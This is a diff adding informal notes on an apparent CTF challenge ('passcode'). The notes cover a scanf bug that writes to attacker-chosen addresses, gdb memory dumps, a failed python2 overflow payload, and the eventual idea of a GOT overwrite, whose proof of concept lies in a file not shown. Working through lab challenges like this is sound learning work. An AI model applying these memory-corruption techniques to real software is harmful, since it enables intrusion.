@@ -1,0 +1,76 @@
+
+this part of the code is wrong what lead to the program to crash
+reasone: scanf takes refrence to a var not the value 
+ 
+     printf("enter passcode1 : ");
+        scanf("%d", passcode1);
+        fflush(stdin);
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+        printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+
+
+we coudl use the buffer in thje welcome 
+since the buffer is a 100 and the scanf takes 100  not 99 (since '\0') 
+when we write the 100 char the program pass part of the buff to passcode1 and passcode2 
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"FFAF"FaFFABCDHFNSLSP"WWWWW"AAAAA
+now some look in gdb to see the values we neeed to change 
+passcode2 = 0x528e6
+passcode1 = 0xcc07c9
+
+lets create the payload!
+
+`python -c 'print "B"*76 + "\xc9\x07\xcc\x00"+15 *"B"+"\xe6\x28\x05\x00" + "A"' > payload`
+`./passcode < payload`
+
+Didnt Work :(
+
+So i was wrong and we could see in the memory below 
+0xffffcce0:	0xf7f905c0	0x080487dd	0xffffcd04	0x00000002
+0xffffccf0:	0x080487dd	0xf7ffda20	0xf7dbead5	0x0804863e
+0xffffcd00:	0x080487dd	0xffffcd18	0xffffcd88	0xf7de8c37
+0xffffcd10:	0xf7f90d40	0x080487f0	0x41414141	0x41414141->  from 0xffffcd18 - 0xffffcd7c0 is the buffer  
+0xffffcd20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd70:	0x41414141	0x41414141	0x41414141	0x6811a400 - > what passcode2 takes for some reason(trying to find out)
+0xffffcd80:	0x080486a0	0xf7ffcb60	0xffffcda8	0x0804867f -> start of the welcome (before calling login) we could see here the return address to the main function
+0xffffcd90:	0x080487f0	0x00000000	0x00000000	0x00000000
+0xffffcda0:	0x00000000	0x00000000	0x00000000	0xf7d8cda5
+
+
+
+
+0xffffcd8c:	0x08048684	0x080487f0	0x00000000	0x00000000 -> next intruduction in main and a string pointer  
+0xffffcd9c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffcdac:	0xf7d8cda5	-> main 
+
+
+0xffffcd60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd70:	0x41414141	0x41414141	0x41414141	0x6811a400
+0xffffcd80:	0x080486a0	0xf7ffcb60	0xffffcda8	0x08048684 -> 0xffffcd8c is the return address to main, -4 is the base stack pointer  
+0xffffcd90:	0x080487f0	0x00000000	0x00000000	0x00000000
+0xffffcda0:	0x00000000	0x00000000	0x00000000	0xf7d8cda5
+
+
+
+
+
+ ► 0x8048572 <login+14>    call   printf@plt                  <printf@plt>
+        format: 0x8048770 ◂— 'enter passcode1 : '
+        vararg: 0x42424242 ('BBBB') -> need to understand this;
+ 
+so first i tried just to overflow the buffer by one byte (over writing the null terminetor) and got that the program write %d to the address of the canary and the last 4 char of the overflow 
+but didnt get an seg fualt (even i trying to write a the address of a canary- random value)
+tried with not overflow the buffer and got an option to write the input to pass1 and pass2 and got a seg fualt becuase i tried to write to the canary address what didnt happen before
+if i try to  
+
+
+
+after a lot of thought I got the idea to overwrite the GOT table and it workes! 
+
+the PoC will be in the exp.py file run with python2 
